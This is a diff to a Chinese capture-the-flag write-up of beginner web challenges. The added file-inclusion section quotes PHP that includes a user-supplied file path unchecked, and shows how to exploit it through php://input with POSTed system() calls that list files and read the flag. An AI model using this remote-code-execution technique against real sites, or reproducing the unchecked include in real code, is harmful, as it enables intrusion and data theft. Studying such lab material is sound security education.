@@ -1,5 +1,11 @@
 # web入门
 
+## 1.信息收集
+
+## 2.爆破
+
+
+
 ## 3.命令执行
 
 ### Web29
@@ -156,4 +162,35 @@
    ```
 
    ![3](img/image-20210608202154453.png)
+
+
+
+## 4.文件包含
+
+#### web78
+
+1. 代码审计
+
+   ```php
+    <?php
+   if(isset($_GET['file'])){
+       $file = $_GET['file'];
+       include($file);
+     //文件包含漏洞
+   }else{
+       highlight_file(__FILE__);
+   } 
+   ```
+
+2. 利用`php://input`伪协议读取数据
+
+   ```shell
+   ?file=php://input
+   
+   #POST数据
+   <?php system('ls');?>
+   <?php system('cat flag.php');?>
+   ```
+
+   ![](img/image-20210608212022359.png)
 
